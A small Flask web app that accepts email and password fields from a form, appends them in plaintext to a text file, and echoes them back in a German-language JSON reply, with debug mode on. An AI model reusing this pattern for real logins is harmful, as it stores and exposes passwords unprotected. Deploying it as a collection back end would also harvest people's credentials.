from flask import Flask, request, jsonify, render_template


#pyinstaller -F --add-data "templates;templates" --add-data "static;static" app.py
variable_names=['email','password']
app = Flask(__name__, static_url_path='/static')
@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/submit_data', methods=['POST'])
def submit_data():
        # Create an empty dictionary to store the form data
    form_data = {}
        
        # Loop over the variable names and add the form data to the dictionary
    for var_name in variable_names:
        form_data[var_name] = request.form[var_name]
    with open('user_data.txt', 'a') as file:
            file.write(f'Form Data: {form_data}\n')
    response_data = {
        'message': f'Daten gespeichert: {form_data}'
    }
    return jsonify(response_data)

if __name__ == '__main__':
    app.run(debug=True)


